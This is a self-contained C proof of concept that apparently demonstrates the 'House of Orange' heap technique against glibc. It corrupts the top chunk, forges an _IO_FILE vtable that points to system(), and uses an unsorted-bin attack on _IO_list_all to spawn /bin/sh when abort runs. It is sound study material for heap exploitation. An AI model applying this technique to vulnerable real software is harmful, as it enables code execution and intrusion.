#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void sys(char* ptr){
	system(ptr);
}

int main(){
	char *p1_chunk = malloc(8) - 2 * 8;	
	size_t*  top = (size_t*) (p1_chunk + 32);
	size_t _IO_list_all;

	top[1] = 0xfe1;

	malloc(0x1000);
	
	memcpy((char*)top,"/bin/sh\x00",8); // _IO_OVERFLOW's parameter
	// fake _IO_FILE_PLUS 
	_IO_FILE *fp = (_IO_FILE *) top;

	fp->_mode = 0; // top +0xc0
	fp->_IO_write_base = (char*)1; // top+0x20
        fp->_IO_write_ptr =  (char*)2; // top+0x28
	
	*(size_t *) (((size_t)fp + sizeof(_IO_FILE))) = (size_t)&top[5];// vtable : &top[12]
	top[8] =(size_t) &sys; // write _IO_OVERFLOW()
	//////////////////////
	
	// unsorted bin attack
	_IO_list_all = top[2] + 0x9a8; // calculate _IO_list_all using offset

	top[3] =(size_t)_IO_list_all - 16;
	/////////////////////
	
	//adjust chunk size
	top[1] = 0x61;
	////////////////////
	
	//triger abort()
	malloc(10);
}

